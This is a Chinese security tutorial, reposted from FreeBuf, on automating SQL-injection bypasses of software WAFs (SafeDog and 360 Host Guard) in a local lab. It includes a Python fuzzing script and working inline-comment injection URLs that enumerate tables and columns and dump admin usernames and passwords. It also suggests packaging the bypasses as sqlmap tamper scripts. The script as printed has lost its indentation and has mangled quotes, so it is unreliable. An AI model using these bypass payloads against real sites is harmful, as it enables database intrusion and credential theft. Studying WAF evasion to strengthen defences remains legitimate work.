> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.colabug.com](https://www.colabug.com/2018/0209/2332069/)

*** 本文原创作者：FK_T，本文属 FreeBuf 原创奖励计划，未经许可禁止转载**

0×00 前言
-------

在我刚接触安全这块时候遇到注入有 WAF 的网站时候无从下手, 寻找各种有关绕过 waf 的文章, 在网页浏览器上使用 SQL 语句为了绕过 WAF 变了个法加了些特殊的数字注释符就懵了, 当然最后经过精心构造的 SQL 语句，数据库必须也得能识别并执行。本文主要介绍如何在本地安装软 WAF 并使用 Python 写的 Fuzz 脚本自动化绕过 WAF 并结合跑出来的 Payload 语句绕过安全防护软件。文章写的比较细主要分享下，更多细节方面请参考上篇文章全方位绕过软 WAF 攻略。

找一些奇葩的语句还可以执行的, 或者自己能构造的, 说的简单点就和密码爆破一样有些人字典强就可以扫到各种强悍的弱口令，Fuzz 跑组合就有姿势了。

0×01 安全狗安装
----------

访问: [http://www.safedog.cn/website_safedog.html](https://www.colabug.com/goto/aHR0cDovL3d3dy5zYWZlZG9nLmNuL3dlYnNpdGVfc2FmZWRvZy5odG1s)

选择自己的平台和 web 容器，我的是 windows 平台，Apacheweb 容器，所以我就下载 windows apache 版

[![](https://img.colabug.com/2018/02/7e450c57ff0e40dda3633293545eded4.jpg)](https://img.colabug.com/2018/02/7e450c57ff0e40dda3633293545eded4.jpg "Fuzz自动化Bypass软WAF姿势")

这里自定义路径，将开机自启动关闭

[![](https://img.colabug.com/2018/02/4307face6bf8893b4fb0396d26ba5dec.jpg)](https://img.colabug.com/2018/02/4307face6bf8893b4fb0396d26ba5dec.jpg "Fuzz自动化Bypass软WAF姿势")

[![](https://img.colabug.com/2018/02/9171780db0105be68b2e2dc4a21c6146.jpg)](https://img.colabug.com/2018/02/9171780db0105be68b2e2dc4a21c6146.jpg "Fuzz自动化Bypass软WAF姿势")

如果是使用 phpstudy 的话，请将运行模式改成系统服务, 不然前面安全狗的插件会安装不上

[![](https://img.colabug.com/2018/02/b565d6fb1105040954c165f697a2f2fa.jpg)](https://img.colabug.com/2018/02/b565d6fb1105040954c165f697a2f2fa.jpg "Fuzz自动化Bypass软WAF姿势")

**0×02** **安全狗卸载**
------------------

这里讲下细节部分卸载安全狗后出现的问题，启动 Apache 会发生错误：

[![](https://img.colabug.com/2018/02/c31efe2cdcdcc61029e2f9496a84d619.jpg)](https://img.colabug.com/2018/02/c31efe2cdcdcc61029e2f9496a84d619.jpg "Fuzz自动化Bypass软WAF姿势")

在 Apache 的 conf 目录下有这样一个文件，SafeDogSiteApacheFilter.Conf，当然当您卸载以后可能这个文件也随之删除了，但是 http.conf 文件中还有这样一段：Include “d:/wamp/apache24/conf/SafeDogSiteApacheFilter.Conf”，我们只需要删除这段话就可以让 apache 成功的启动了

[![](https://img.colabug.com/2018/02/e7ba406ef2629ff1945122c73915df13.jpg)](https://img.colabug.com/2018/02/e7ba406ef2629ff1945122c73915df13.jpg "Fuzz自动化Bypass软WAF姿势")

**SQL 注入代码**

```
query($sql);
if($result === false){//执行失败
    echo $mysqli->error;
    echo $mysqli->errno;
}
echo '
';
echo '';
while($row = $result->fetch_assoc()){
echo '';
    echo '';
    echo '';
    echo '';
    echo '';
}
echo '
ID	a	fkt
'.$row['id'].'	wait	'.$row['content'].'
';
$mysqli->close();
?>
```

**mysql 语句**

```
mysql> create database fkt;
Query OK, 1 row affected (0.00 sec)
mysql> use fkt;
Database changed
mysql> CREATE TABLE new(
    ->     id int not null,
    ->     content char(20)
    -> );
Query OK, 0 rows affected (0.19 sec)
mysql> insert into new
    -> values(
    -> '1','xiaobai');
Query OK, 1 row affected (0.02 sec)
```

**0×03** **mysql 模拟注入查询**


-----------------------------

mysql 的注释有三种方式：

```
1、块注释：/*  ….. */
2、行注释：#
3、行注释：– （–%20，注意后面有一个空格，与SQL标准稍有差别）
```

自 MySQL3.23 版以来，可在 C 风格的注释中 “隐藏” MySQL 特有的关键字，注释以“/ * !” 而不是以 “ / *” 起头

现在我们在 mysql 命令行中执行一下 SQL 语句：

```
Select * from news where id=1
Select * from news /*!where*/id=1
```

我们来看下在命令行下执行的结果：

[![](https://img.colabug.com/2018/02/61c53a7af4a3634c148f34c96b388d17.jpg)](https://img.colabug.com/2018/02/61c53a7af4a3634c148f34c96b388d17.jpg "Fuzz自动化Bypass软WAF姿势")

还是可以正常的查询出内容, 我们在 mysql 命令行中进行下联合查询注入：Order by N

```
Select * from new where id =1 order by 1；
Select * from new where id =1 order by 2；
```

Order by 测试出字段为 2：

[![](https://img.colabug.com/2018/02/0b5b7756251477ba95999e42718acbf2.jpg)](https://img.colabug.com/2018/02/0b5b7756251477ba95999e42718acbf2.jpg "Fuzz自动化Bypass软WAF姿势")

使用 mysql 联合查询步骤，模拟 SQL 注入回显数据

```
select * from new where id=1 union all select null,null;
select * from new where id=1 and 1=2 union all select null,null;
select * from new where id=1 and 1=2 union all select user(),null;
```

[![](https://img.colabug.com/2018/02/49eac71059c7f020b6046bdf3a3998d0.jpg)](https://img.colabug.com/2018/02/49eac71059c7f020b6046bdf3a3998d0.jpg "Fuzz自动化Bypass软WAF姿势")

这样也是能正常查询出来的

```
mysql> select * from new where id=1 and 1=2 union all select /*!user*//*!()*/,null;
```

****[![](https://img.colabug.com/2018/02/e60dfa7046a1d7f8bc90af0bbc54a562.jpg)](https://img.colabug.com/2018/02/e60dfa7046a1d7f8bc90af0bbc54a562.jpg "Fuzz自动化Bypass软WAF姿势")  
****

我们在浏览器上通过内联注释注入一下看看会不会被拦截，还是被拦截了，老版本的安全狗可以通过内联注释绕过所以咱们今天 Fuzz 自动化 Bypass 的思路就是结合这个内联注释，加一些特殊符号，以及 url 编码来进行对安全狗的绕过

```
http://192.168.30.129/fuzz/index.php?id=1/*!union*//*!select*/1,2
```

[![](https://img.colabug.com/2018/02/8573d0b0d997ca06e51cdfa2f00eaee7.jpg)](https://img.colabug.com/2018/02/8573d0b0d997ca06e51cdfa2f00eaee7.jpg "Fuzz自动化Bypass软WAF姿势")

****0×04** **Fuzz 自动化 bypass****
--------------------------------

代码比较简洁我就直接给上注释了这样看得清晰点，只要是在释符号里面就可以包括任意特殊的符号等, 挡住 WAF 的视线这样说更明白点。列如: /*!unionselect*/

Fuzz 脚本代码如下：

[![](https://img.colabug.com/2018/02/a8b469300e53479cceb411735cfaf56f.jpg)](https://img.colabug.com/2018/02/a8b469300e53479cceb411735cfaf56f.jpg "Fuzz自动化Bypass软WAF姿势")

注意底部我的 SQL 查询的页面中有 wait 这个字符, 没有 wait 的话你就看看” 正常的页面在有啥必出现的字符 改了就行或者在加个 else print （” 未过狗”）

**code 如下：**

#encoding=utf-8

#实现思路；

#不被拦截的页面上会出现字符 “wait”

#被拦截的不会，使用 for 循环请求并检查返回的页面中是否存在该字符即可。

import requests

#引入请求模块

url = ” [http://127.0.0.1/index.php?id=1](https://www.colabug.com/goto/aHR0cDovLzEyNy4wLjAuMS9pbmRleC5waHA/aWQ9MQ==) “;

#定义目标

Fuzz_a = [‘/*!’,’*/’,’/**/’,’/’,’?’,’~’,’!’,’.’,’%’,’-‘,’*’,’+’,’=’]

Fuzz_b = [”]

Fuzz_c = [‘%0a’,’%0b’,’%0c’,’%0d’,’%0e’,’%0f’,’%0h’,’%0i’,’%0j’]

FUZZ = Fuzz_a+Fuzz_b+Fuzz_c

#配置 fuzz 字典

header = {‘User-Agent’:’Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0′}

#设置请求的 headers

for a in FUZZ:

pass

for b in FUZZ:

pass

for c in FUZZ:

for d in FUZZ:

pass

for e in FUZZ:

pass

PYLOAD = “/*!union”+a+b+c+d+e+”select*/ 1,2”

urlp = url+PYLOAD

res = requests.get(urlp,headers=header)

#使用 for 排列组合 fuzz 字典并请求页面

if ‘wait’ in res.text:

print (“[*]URL:”+ urlp +” 过狗！”)

f=open(‘result.txt’,’a’)

f.write(urlp+”n”)

f.close

#如果返回的页面中包含 wait 字符，则打印并写出过狗 payload。

将这段代码放进 kali linux，或者 windows 系统需要安装 pip 模块 python2.7 即可然后运行一下

[![](https://img.colabug.com/2018/02/5130e0b0c96fe1943dc628462da619a0.jpg)](https://img.colabug.com/2018/02/5130e0b0c96fe1943dc628462da619a0.jpg "Fuzz自动化Bypass软WAF姿势")

在运行之前一定要将 cc 防护关闭, 或者把ＩＰ黑名单关掉 Fuzz 过快容易被封 IP

在 windows 系统上运行几分钟后, 会出现一个叫 result.txt 的文件，里面就是我们跑出来的姿势了

[![](https://img.colabug.com/2018/02/a07765fd97498ca29b6aed652a8e8e63.jpg)](https://img.colabug.com/2018/02/a07765fd97498ca29b6aed652a8e8e63.jpg "Fuzz自动化Bypass软WAF姿势")

kali 运行结果如下

[![](https://img.colabug.com/2018/02/295a308e30a4c66ad23bc0cc80752e74.jpg)](https://img.colabug.com/2018/02/295a308e30a4c66ad23bc0cc80752e74.jpg "Fuzz自动化Bypass软WAF姿势")

随便取一个姿势出来看看姿势有了

```
http://192.168.30.129/fuzz/index.php?id=1/*!union/*!/*!*//*!select/*!/*!*/1,2
```

[![](https://img.colabug.com/2018/02/e5819d01fe66fec6bfae8918a3fa3ca0.jpg)](https://img.colabug.com/2018/02/e5819d01fe66fec6bfae8918a3fa3ca0.jpg "Fuzz自动化Bypass软WAF姿势")

我们来手工绕过下吧！

```
http://192.168.30.129/fuzz/index.php?id=1/*!union/*!/*!*//*!select/*!/*!*//*!user()/*!/*!*/,2
```

[![](https://img.colabug.com/2018/02/92ac0eb061949268fcbfdb01e5a07ca3.jpg)](https://img.colabug.com/2018/02/92ac0eb061949268fcbfdb01e5a07ca3.jpg "Fuzz自动化Bypass软WAF姿势")

这样又被拦截了，“你不是说绕过了安全狗了吗？”。当然已经绕过了，需要这样写语句

```
http://192.168.30.129/fuzz/index.php?id=1/*!union/*!/*!*//*!select/*!/*!*//*!user/*!/*!()*/,2
```

[![](https://img.colabug.com/2018/02/00eb7ecac2d2600f353e0b6f82361cda.jpg)](https://img.colabug.com/2018/02/00eb7ecac2d2600f353e0b6f82361cda.jpg "Fuzz自动化Bypass软WAF姿势")

```
http://192.168.30.129/fuzz/index.php?id=1/*!union/*!/*!*//*!select/*!/*!*//*!user/*!/*!()*/,/*!database/*!()*/
```

[![](https://img.colabug.com/2018/02/e3184cc14356fb64ed5ddd829fd8da5d.jpg)](https://img.colabug.com/2018/02/e3184cc14356fb64ed5ddd829fd8da5d.jpg "Fuzz自动化Bypass软WAF姿势")

```
http://localhost/fuzz/index.php?id=1/*!and/*!/*!*//*!1=2/*!/*!*//*!UNION/*!/*!*//*!ALL/*!/*!*//*!SELECT/*!/*!*//*!group_concat(table_name)/*!/*!*/,NULL/*!from/*!/*!*//*!information_schema.tables/*!/*!*//*!where/*!/*!*//*!table_schema=/*!/*!*//*!database/*!/*!()*/
```

[![](https://img.colabug.com/2018/02/c56f7171122cb1984305a51ec34f2c4f.jpg)](https://img.colabug.com/2018/02/c56f7171122cb1984305a51ec34f2c4f.jpg "Fuzz自动化Bypass软WAF姿势")

```
http://localhost/fuzz/index.php?id=1/*!and/*!/*!*//*!1=2/*!/*!*//*!UNION/*!/*!*//*!ALL/*!/*!*//*!SELECT/*!/*!*//*!group_concat(column_name)/*!/*!*/,NULL/*!from/*!/*!*//*!information_schema.columns/*!/*!*//*!where/*!/*!*//*!table_name=/*!/*!*//*!"admin"/*!/*!*/
```

[![](https://img.colabug.com/2018/02/cfab6d2f4025c4a426eddf75cdeea1af.jpg)](https://img.colabug.com/2018/02/cfab6d2f4025c4a426eddf75cdeea1af.jpg "Fuzz自动化Bypass软WAF姿势")

获取出了 admin 表的字段

```
http://localhost/fuzz/index.php?id=1/*!and/*!/*!*//*!1=2/*!/*!*//*!UNION/*!/*!*//*!ALL/*!/*!*//*!SELECT/*!/*!*//*!group_concat(concat(user,0x2c,pwd))/*!/*!*/,NULL/*!from/*!/*!*//*!admin/*!/*!*/
```

[![](https://img.colabug.com/2018/02/5dd1eab31425473e3993c753d329ebd9.jpg)](https://img.colabug.com/2018/02/5dd1eab31425473e3993c753d329ebd9.jpg "Fuzz自动化Bypass软WAF姿势")

**360 主机卫士 Fuzz**

同样的我们来测试下 360 主机卫士

[![](https://img.colabug.com/2018/02/aa3bab29d8ef815fb216477f4801ef86.jpg)](https://img.colabug.com/2018/02/aa3bab29d8ef815fb216477f4801ef86.jpg "Fuzz自动化Bypass软WAF姿势")

Fuzz 匹配到的语句

[![](https://img.colabug.com/2018/02/6fc345676c4b964e3ecf182e5da96d14.jpg)](https://img.colabug.com/2018/02/6fc345676c4b964e3ecf182e5da96d14.jpg "Fuzz自动化Bypass软WAF姿势")

[http://192.168.30.135/fuzz/index.php?id=1/](https://www.colabug.com/goto/aHR0cDovLzE5Mi4xNjguMzAuMTM1L2Z1enovaW5kZXgucGhwP2lkPTEv) *!union/*!/*!/*!%0d%0dselect*/ 1,2 取一个姿势试试完全可以

[![](https://img.colabug.com/2018/02/f285c48e31b63b94854bcadf30dc7f9e.jpg)](https://img.colabug.com/2018/02/f285c48e31b63b94854bcadf30dc7f9e.jpg "Fuzz自动化Bypass软WAF姿势")

这样就完全没问题了！姿势有了，当然也可以写入到 Sqlmap 的 Tamper 脚本上, Copyslqmaptamper 目录下文件 , 按照他的规则，照着改下就行了

最后附上一个过 360 主机的脚本 可以参考 按照如下写法

[![](https://img.colabug.com/2018/02/6aef1f3874fe357590051776fb2a58b3.jpg)](https://img.colabug.com/2018/02/6aef1f3874fe357590051776fb2a58b3.jpg "Fuzz自动化Bypass软WAF姿势")

[![](https://img.colabug.com/2018/02/ccb706a15cec6d68a1b1fce2d37424a5.jpg)](https://img.colabug.com/2018/02/ccb706a15cec6d68a1b1fce2d37424a5.jpg "Fuzz自动化Bypass软WAF姿势")

**结尾：**
-------

文章只是抛砖引玉了下, 主要是个思路学习过程, 使用 Pyhton 脚本结合了下 Mysql 内联注释定义了一些特殊符号相当给脚本配合了一个字典达到 Fuzz 最终的效果，完了之后 也可以对比一下，看一下能过的 Fuzz 有没有特点的规律 总结一下。当然也可以自己在自定义一些，在测试其他的软 WAF 不局限于以上这些内容。

*** 本文原创作者：FK_T，本文属 FreeBuf 原创奖励计划，未经许可禁止转载**

注意：本文来自。本站无法对本文内容的真实性、完整性、及时性、原创性提供任何保证，请您自行验证核实并承担相关的风险与后果！  
CoLaBug.com 遵循 [[CC BY-SA 4.0](https://www.colabug.com/goto/cclicensing)] 分享并保持客观立场，本站不承担此类作品侵权行为的直接责任及连带责任。您有版权、意见、投诉等问题，请通过 [[eMail]](https://www.colabug.com/goto/tousu) 联系我们处理，如需商业授权请联系原作者 / 原网站。